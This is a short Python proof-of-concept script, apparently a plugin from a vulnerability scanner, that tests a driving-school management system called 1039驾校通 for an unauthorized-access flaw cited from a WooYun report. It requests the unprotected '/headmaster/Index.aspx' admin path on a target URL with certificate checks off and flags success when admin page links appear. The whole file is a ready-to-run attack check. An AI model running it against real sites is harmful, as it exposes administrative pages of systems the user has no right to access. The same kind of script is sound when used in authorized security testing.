#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 1039驾校通未授权访问漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0132856
author: Lucifer
description: 1039驾校通通用型系统存在未授权漏洞。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class jxt1039_unauth:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/headmaster/Index.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"ShengQingPS.aspx" in req.text and r"LiuShuiZhang.aspx" in req.text:
                printGreen("[+]Success:存在1039驾校通未授权访问漏洞...(中危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在jxt1039_unauth漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = jxt1039_unauth(sys.argv[1])
    testVuln.run()